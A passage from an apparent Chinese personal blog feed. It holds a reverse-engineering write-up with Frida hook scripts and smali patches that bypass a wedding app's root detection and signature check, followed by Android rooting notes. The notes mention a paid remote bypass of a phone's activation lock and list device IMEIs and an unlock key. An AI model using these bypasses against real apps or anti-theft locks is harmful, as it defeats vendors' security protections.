class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> <span class="hljs-title class_">ZGRootChecker</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;me.suncloud.marrymemo.fragment.login.zg.ZGRootChecker&quot;</span>);<br><span class="hljs-title class_">ZGRootChecker</span>[<span class="hljs-string">&quot;isDeviceRooted&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;isDeviceRooted is called&#x27;</span>);<br>    <span class="hljs-keyword">let</span> ret = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isDeviceRooted</span>();<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;isDeviceRooted ret value is &#x27;</span> + ret);<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;;<br></code></pre></td></tr></table></figure><p>获取app 进程号，我发现dumpsys 获取不到，可以通过ps 查看进程pid<br><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240103225513890.png"></p><p>Frida Hook 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Author       : TigerHu</span><br><span class="hljs-string">Version      : V1.0</span><br><span class="hljs-string">Date         : 2024-01-03 22:30:03</span><br><span class="hljs-string">Description  : </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">adb_forward</span>():<br>    os.system(<span class="hljs-string">&#x27;adb forward tcp:27042 tcp:27042&#x27;</span>)<br>    os.system(<span class="hljs-string">&#x27;adb forward tcp:27043 tcp:27043&#x27;</span>)<br><br>jscode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Java.perform(function()&#123; </span><br><span class="hljs-string">        let ZGRootChecker = Java.use(&quot;me.suncloud.marrymemo.fragment.login.zg.ZGRootChecker&quot;);</span><br><span class="hljs-string">        ZGRootChecker[&quot;isDeviceRooted&quot;].implementation = function () &#123;</span><br><span class="hljs-string">            console.log(&#x27;isDeviceRooted is called&#x27;);</span><br><span class="hljs-string">            let ret = this.isDeviceRooted();</span><br><span class="hljs-string">            console.log(&#x27;isDeviceRooted ret value is &#x27; + ret);</span><br><span class="hljs-string">            return False;</span><br><span class="hljs-string">        &#125;;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]  &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br>adb_forward()<br><span class="hljs-comment"># 查找远程设备并附加到目标进程</span><br><span class="hljs-comment"># frida.get_remote_device() 远程设备,模拟器</span><br><span class="hljs-comment"># frida.get_usb_device  获取usb 设备</span><br>process = frida.get_usb_device().attach(<span class="hljs-number">3470</span>)<br><span class="hljs-comment">#pid = device.spawn([&quot;com.android.chrome&quot;])</span><br><span class="hljs-comment">#session = device.attach(pid)</span><br><span class="hljs-comment">#device.resume(pid)</span><br><span class="hljs-comment"># 在目标进程里创建脚本</span><br>script = process.create_script(jscode)<br><span class="hljs-comment"># 注册消息回调</span><br>script.on(<span class="hljs-string">&quot;message&quot;</span>, on_message)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Hook Start Running&#x27;</span>)<br><span class="hljs-comment"># 加载创建好的javascript 脚本</span><br>script.load()<br><span class="hljs-comment"># 读取系统输入</span><br>sys.stdin.read()<br><br></code></pre></td></tr></table></figure><p>测试通过</p><p><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240103225336215.png"></p><p><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240103225633863.jpeg"></p><h2 id="绕过签名校验"><a href="#绕过签名校验" class="headerlink" title="绕过签名校验"></a>绕过签名校验</h2><p>测试一下app的签名校验是否有效，使用MT管理器重新签名安装，可以看到会弹出提示词，提示词内容和前面分析的是一致的。</p><p><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240103230037131.png"></p><p>直接上frida hook 一下。</p><p>hook 这一块无效</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> <span class="hljs-title class_">ZGSafetyMonitor</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;me.suncloud.marrymemo.fragment.login.zg.ZGSafetyMonitor&quot;</span>);<br><span class="hljs-title class_">ZGSafetyMonitor</span>[<span class="hljs-string">&quot;checkSHA1&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">context, sha1</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;checkSHA1 is called&#x27;</span> + <span class="hljs-string">&#x27;, &#x27;</span> + <span class="hljs-string">&#x27;context: &#x27;</span> + context + <span class="hljs-string">&#x27;, &#x27;</span> + <span class="hljs-string">&#x27;sha1: &#x27;</span> + sha1);<br>    <span class="hljs-keyword">let</span> ret = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">checkSHA1</span>(context, sha1);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;checkSHA1 ret value is &#x27;</span> + ret);<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;;<br></code></pre></td></tr></table></figure><p>最终hook 了这个函数<br><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240103231357323.png"></p><h3 id="frida-hook-1"><a href="#frida-hook-1" class="headerlink" title="frida hook"></a>frida hook</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Author       : TigerHu</span><br><span class="hljs-string">Version      : V1.0</span><br><span class="hljs-string">Date         : 2024-01-03 22:30:03</span><br><span class="hljs-string">Description  : </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">adb_forward</span>():<br>    os.system(<span class="hljs-string">&#x27;adb forward tcp:27042 tcp:27042&#x27;</span>)<br>    os.system(<span class="hljs-string">&#x27;adb forward tcp:27043 tcp:27043&#x27;</span>)<br><br>jscode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">// 这一部分是绕过签名校验</span><br><span class="hljs-string">    Java.perform(function()&#123; </span><br><span class="hljs-string">        let ZGSignatureChecker = Java.use(&quot;me.suncloud.marrymemo.fragment.login.zg.ZGSignatureChecker&quot;);</span><br><span class="hljs-string">        ZGSignatureChecker[&quot;checkSHA1&quot;].implementation = function () &#123;</span><br><span class="hljs-string">            console.log(&#x27;checkSHA1 is called&#x27;);</span><br><span class="hljs-string">            let ret = this.checkSHA1();</span><br><span class="hljs-string">            console.log(&#x27;checkSHA1 ret value is &#x27; + ret);</span><br><span class="hljs-string">            return true;</span><br><span class="hljs-string">        &#125;;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">    // 这一部分是绕过root检测</span><br><span class="hljs-string">    Java.perform(function()&#123; </span><br><span class="hljs-string">    let ZGRootChecker = Java.use(&quot;me.suncloud.marrymemo.fragment.login.zg.ZGRootChecker&quot;);</span><br><span class="hljs-string">    ZGRootChecker[&quot;isDeviceRooted&quot;].implementation = function () &#123;</span><br><span class="hljs-string">        console.log(&#x27;isDeviceRooted is called&#x27;);</span><br><span class="hljs-string">        let ret = this.isDeviceRooted();</span><br><span class="hljs-string">        console.log(&#x27;isDeviceRooted ret value is &#x27; + ret);</span><br><span class="hljs-string">        return False;</span><br><span class="hljs-string">    &#125;;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*]  &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br>adb_forward()<br><span class="hljs-comment"># 查找远程设备并附加到目标进程</span><br><span class="hljs-comment"># frida.get_remote_device() 远程设备,模拟器</span><br><span class="hljs-comment"># frida.get_usb_device  获取usb 设备</span><br>process = frida.get_usb_device().attach(<span class="hljs-number">16572</span>)<br><span class="hljs-comment">#pid = device.spawn([&quot;com.android.chrome&quot;])</span><br><span class="hljs-comment">#session = device.attach(pid)</span><br><span class="hljs-comment">#device.resume(pid)</span><br><span class="hljs-comment"># 在目标进程里创建脚本</span><br>script = process.create_script(jscode)<br><span class="hljs-comment"># 注册消息回调</span><br>script.on(<span class="hljs-string">&quot;message&quot;</span>, on_message)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Hook Start Running&#x27;</span>)<br><span class="hljs-comment"># 加载创建好的javascript 脚本</span><br>script.load()<br><span class="hljs-comment"># 读取系统输入</span><br>sys.stdin.read()<br><br></code></pre></td></tr></table></figure><h2 id="修改Smali绕过检测"><a href="#修改Smali绕过检测" class="headerlink" title="修改Smali绕过检测"></a>修改Smali绕过检测</h2><h3 id="绕过签名校验-1"><a href="#绕过签名校验-1" class="headerlink" title="绕过签名校验"></a>绕过签名校验</h3><p>这里要让 checkSHA1() 返回true 。<br><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240103234954167.png"></p><h3 id="绕过root-检测"><a href="#绕过root-检测" class="headerlink" title="绕过root 检测"></a>绕过root 检测</h3><p>这里记住是改为 0 ，因为要让isDeviceRooted函数返回false。<br><img src="/67__%E9%80%86%E5%90%91__%E5%A9%9A%E7%A4%BC%E7%BA%AAAPP.assets/image-20240103234652758.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Android各种机型刷机踩坑记录</title>
    <link href="/2024/01/02/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/01/02/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>手机刷机前要知道的一些基础知识<br><a href="https://xqrp.com/657891.html">https://xqrp.com/657891.html</a></p><p>线刷：利用数据线将手机与电脑连接，刷入刷机包recovery 等固件的方式。</p><p> 卡刷： 用电脑在手机fastboot 模式下刷入第三方rec， 也就是大家常说的twrp。刷入完成，用rec 方式进入twrp，进入电脑下载好卡刷包，然后复制移动进去内置存储，选中卡刷包，等待刷入完成即可。</p><p>这里有一个小技巧，如果实在自己官方系统不开机，你可以尝试一下刷第三方的rom 将就用。</p><p>ozip: ozip 是 oppo 的加密格式，无法直接解压修改，必须转换成zip才可以编辑，可以用ozip 转换zip 的工具来实现。</p><h1 id="oppo-Find-X-解锁ROOT"><a href="#oppo-Find-X-解锁ROOT" class="headerlink" title="oppo Find X 解锁ROOT"></a>oppo Find X 解锁ROOT</h1><p><strong>安装深度测试app</strong></p><p>手机开启USB 调试，然后使用adb 安装 apk </p><p><strong>手机系统版本：</strong></p><ul><li>ColorOs V11</li><li>Android 11</li><li>Find X 全网通版 （PAFM00）</li><li>IMEI 1 : 862716047717796</li><li>IMEI 2:  862716047717788</li><li>版本号： PAFM00_11_H.15</li><li>基带版本： Q_V1_P14,Q_V1_P14</li></ul><h2 id="手机解锁BL-申请"><a href="#手机解锁BL-申请" class="headerlink" title="手机解锁BL 申请"></a>手机解锁BL 申请</h2><p>手机下载OPPO 社区</p><p><a href="https://www.oppo.cn/thread-397164526-1">https://www.oppo.cn/thread-397164526-1</a></p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20220926153606844.png"></p><h2 id="手机刷机降级"><a href="#手机刷机降级" class="headerlink" title="手机刷机降级"></a>手机刷机降级</h2><p>刷机图文详解教程： </p><p>下载卡刷包OTA固件ROM，通过官方的刷机教程，显示安装版本低于当前使用版本</p><p>现在的版本是最早的版本。</p><p>最低的话是只能降出厂版本。</p><h3 id="刷root-步骤"><a href="#刷root-步骤" class="headerlink" title="刷root 步骤"></a>刷root 步骤</h3><p><strong>刷机前提</strong></p><p>手机USB 连接到笔记本，保证adb 可以进入到手机的shell 中。</p><p>手机通过深度测试。</p><p><strong>首先进入fastboot 模式</strong></p><p>我们可以看到Device STATE: locked, 此时说明手机的bootloader 处于锁定的状态。</p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221104104525701.png" alt="image-20221104104525701"></p><p>输入以下的命令，对 bootloader 进行解锁。</p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221104105227827.png" alt="image-20221104105227827"></p><p>手机的页面会从上面的页面弹到下面的页面，这个页面是询问是否能解锁，确认解锁就使用音量键选择 UNLOCK THE BOOTLOADER </p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221104105157753.png" alt="image-20221104105157753"></p><h3 id="申诉激活"><a href="#申诉激活" class="headerlink" title="申诉激活"></a>申诉激活</h3><p>【欢太科技】尊敬的用户，您好！当前需要您提交帐号申诉解决问题，为了提高申诉通过率，请点击：<a href="https://opdwz.cn/6Nz2E3h">https://opdwz.cn/6Nz2E3h</a> 查看申诉填写的图文操作指引。看完指导后再点击：<a href="https://safe.heytap.com/">https://safe.heytap.com</a>  开始填写申诉。<br>温馨提醒： 1.申诉结果会在1-2个工作日内尽快发送给您； 2.申诉进度可点击：<a href="https://opdwz.cn/ZF7zUvu">https://opdwz.cn/ZF7zUvu</a> 查询。3.帐号脱绑请点击申诉首页的“忘记帐号”进行申诉。 如有疑问，请点击<a href="https://opdwz.cn/jARRBzl">https://opdwz.cn/jARRBzl</a> 寻求在线客服帮助，祝您生活愉快！</p><p>参考moto 手机里的视频 ，最后一步 是打开查找功能</p><p>这里遇到了两个问题<br>问题1： 由于设备时二手手机，所以买了刷机的时候，有激活锁，因为是二手手机，所以并不知道原始的激活码。</p><p>解决：在淘宝花了30块钱，远程通过盲人模式绕过了激活锁，后面有时间把绕过激活锁这个流程发布出来。</p><p>问题2： 由于oppo 并没有发布官方的rom，不小心刷了第三方的社区的rom，手机成砖了。、</p><p>解决： 跟oppo的客服打电话求助，说这一块要带着发票和购买凭证去刷机，然后在软磨硬泡下，最终同意我拿到线下维修点，帮我刷机。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>OPPO Find X 解锁 BootLoader &amp; root </p><p><a href="https://wuxianlin.com/2018/09/22/oppo-findx-root/">https://wuxianlin.com/2018/09/22/oppo-findx-root/</a></p><p>小米只能进fastboot 和rec 救砖</p><p><a href="https://blog.csdn.net/weixin_49941977/article/details/126836851">https://blog.csdn.net/weixin_49941977/article/details/126836851</a></p><h1 id="moto-手机ROOT"><a href="#moto-手机ROOT" class="headerlink" title="moto 手机ROOT"></a>moto 手机ROOT</h1><h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p><a href="https://motorola-global-portal.custhelp.com/app/standalone/bootloader/unlock-your-device-b">https://motorola-global-portal.custhelp.com/app/standalone/bootloader/unlock-your-device-b</a></p><p><a href="https://www.bilibili.com/read/cv18455372">https://www.bilibili.com/read/cv18455372</a></p><p>先注册账号，然后下载sdk tools ,主要是安装 adb  和fastboot工具</p><p>然后把oem解锁打开，这样才能解锁bl。</p><p>关机，同时按住音量键和电源键。进入到fastboot模式</p><p>电脑获取unlock_data </p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221017215343829.png" alt="image-20221017215343829"></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-number">3</span>A25715324260537#<span class="hljs-number">5</span>A59323246435A52504B005854323135332D0000#CE1B023F6A41419996033FB2FA351C0AC857A93AF987B17F09E9307F74AF1404#FF648548000000000000000000000000<br></code></pre></td></tr></table></figure><p>然后把unlock data 提交到moto</p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221017215524203.png" alt="image-20221017215524203"></p><p>moto 会让你请求unlock key的值，</p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221017215622346.png" alt="image-20221017215622346"></p><p>然后你的邮箱会收到一封解锁码的邮件</p><p>X2A4XZK43D65OKRHBA5F</p><p>然后下载boot.img</p><p><a href="https://mirrors.lolinet.com/firmware/motorola/pstar_retcn/official/CMCC/">https://mirrors.lolinet.com/firmware/motorola/pstar_retcn/official/CMCC/</a></p><p>需要根据你的安卓版本，系统标识 来确定安装 对应的zip 压缩包</p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221018103413652.png" alt="image-20221018103413652"></p><p>然后打开线刷包，把boot.img 文件提取出来，再 adb push 到手机。</p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221018104501654.png" alt="image-20221018104501654"></p><p>然后手机安装Magisk ，官方Github:<a href="https://github.com/topjohnwu/Magisk/releases">https://github.com/topjohnwu/Magisk/releases</a></p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221018105221661.png" alt="image-20221018105221661"></p><p>安装完了之后，手机打开Magisk， 点击安装，选择一个修补文件，选择之前push 进去的boot.img。</p><p>然后在 &#x2F;sdcard&#x2F;Download&#x2F; 中可以看到一个magisk_patch_xx.ing 的文件。</p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221018105421397.png" alt="image-20221018105421397"></p><p>把这两个文件下到本地目录中。</p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221018105702062.png" alt="image-20221018105702062"></p><p>然后adb reboot bootloader，设备会重启，并且卡在bootloader 上。</p><p>然后电脑 fastboot flash boot magisk_patched_xxx.img</p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221018110622689.png" alt="image-20221018110622689"></p><p>然后重启</p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221018111815419.png" alt="image-20221018111815419"></p><p>打开magrisk，然后点击直接安装后设备会重启</p><p>然后adb  到设备里面，可以看到我们已经是最高的权限了。</p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20221018111750292.png" alt="image-20221018111750292"></p><h2 id="安装Xpose-框架"><a href="#安装Xpose-框架" class="headerlink" title="安装Xpose 框架"></a>安装Xpose 框架</h2><p>安装LSPosed  ，LSPosed 是Edxposed 的一个新分支，也是一款开源的GitHub上的Xposed 框架。</p><p>LSPosed 基于Riru 的ART 挂钩提供与原版Xposed 相同的API,可以在不修改APK文件的情况下调控程序的运行。</p><p>LSPosed开源地址：<a href="https://github.com/LSPosed/LSPosed/releases">https://github.com/LSPosed/LSPosed/releases</a></p><p>adb push LSPosed &#x2F;sdcard&#x2F; 中，然后用magisk 加载这个模块。重启</p><p>然后安装JustTrustMe.apk 和 justTrustMePlush-release.apk。然后再LSPosed 中启用这两个模块。</p><h2 id="安装-drozer"><a href="#安装-drozer" class="headerlink" title="安装 drozer"></a>安装 drozer</h2><p>见印象笔记 –“10-IOT”– “drozer 安装和使用” 。</p><h2 id="安装-Inspeckage"><a href="#安装-Inspeckage" class="headerlink" title="安装 Inspeckage"></a>安装 Inspeckage</h2><p>下载路径(2018) <a href="https://github.com/ac-pm/Inspeckage/releases">https://github.com/ac-pm/Inspeckage/releases</a></p><h2 id="安装Frida"><a href="#安装Frida" class="headerlink" title="安装Frida"></a>安装Frida</h2><p><a href="https://www.52pojie.cn/thread-1100931-1-1.html">https://www.52pojie.cn/thread-1100931-1-1.html</a></p><p>pip 安装Frida 和 frida-tools</p><p>下载 frida 版本：<a href="https://pypi.python.org/pypi/frida">https://pypi.python.org/pypi/frida</a></p><p>esay_install frida_package.egg</p><p>下载 frida-tools : pip install frida-tools -i <a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a> –trusted-host pypi.douban.com</p><p>运行frida-ps 证明安装成功。</p><p>下载手机服务端的frida:  <a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a><br>查看手机的指令架构<br><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231228215901605.png"><br>下载<br><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231228215925917.png"></p><h3 id="连接Frida"><a href="#连接Frida" class="headerlink" title="连接Frida"></a>连接Frida</h3><p>手机端启动 frida </p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20230313133800713.png" alt="image-20230313133800713"></p><p>client 连接 frida，报错。</p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20230313133722863.png" alt="image-20230313133722863"></p><p>电脑端安装的frida 版本 (可通过 frida –version ) 与adb 传到手机中的 frida-server-版本号-android-arm64不一致。</p><p>确保版本一致后。执行 frida-ps -R (查看进程)   和 frida-ps -U ( 检查Usb 设备 )</p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20230313144026020.png" alt="image-20230313144026020"></p><p>问题：测试半天，版本不一致<br><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231224212056166.png"></p><h1 id="雷电模拟器"><a href="#雷电模拟器" class="headerlink" title="雷电模拟器"></a>雷电模拟器</h1><p>1.下载模拟器</p><p>2.开启root</p><p>3.安装xposed，直接把xposed 拖入到模拟器的共享文件夹中安装。</p><p><a href="https://themagisk.com/lsposed/">https://themagisk.com/lsposed/</a></p><p>有很多教程，这里没有记录。</p><h1 id="Pixel-6p-root"><a href="#Pixel-6p-root" class="headerlink" title="Pixel 6p root"></a>Pixel 6p root</h1><h2 id="Android-13-失败"><a href="#Android-13-失败" class="headerlink" title="Android 13 失败"></a>Android 13 失败</h2><p>Android 版本: 13<br>版本号： TQ1A.230205.002<br>IMEI号 ： 358339773757307</p><h3 id="第一步-进入bootloader"><a href="#第一步-进入bootloader" class="headerlink" title="第一步 进入bootloader"></a>第一步 进入bootloader</h3><p>adb reboot bootloader </p><h3 id="第二步-解锁bootloader"><a href="#第二步-解锁bootloader" class="headerlink" title="第二步  解锁bootloader"></a>第二步  解锁bootloader</h3><p>先使用fastboot devices 查看是否识别处于fastboot 模式的pixel。</p><p>然后 fastboot flashing unlock</p><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205103743301.png"></p><h3 id="第三步-下载对应的系统镜像"><a href="#第三步-下载对应的系统镜像" class="headerlink" title="第三步 下载对应的系统镜像"></a>第三步 下载对应的系统镜像</h3><p>官网下载地址： <a href="https://developers.google.com/android/images?hl=zh-cn">https://developers.google.com/android/images?hl=zh-cn</a></p><h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p><img src="/13__Android%E5%90%84%E7%A7%8D%E6%9C%BA%E5%9E%8B%E5%88%B7%E6%9C%BA%E8%AE%B0%E5%BD%95.assets/image-20231205141725538.png"></p><h2 id="android-14"><a href="#android-14" class="headerlink" title="android 14"></a>android 14</h2><h3 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h3><p>开启adb<br>解锁bootloader 为unlock<br>安装magisk</p><h3 id="下载镜像文件"><a href="#下载镜像文件" class="headerlink" title="下载镜像文件"></a>下载镜像文件</h3><p><a 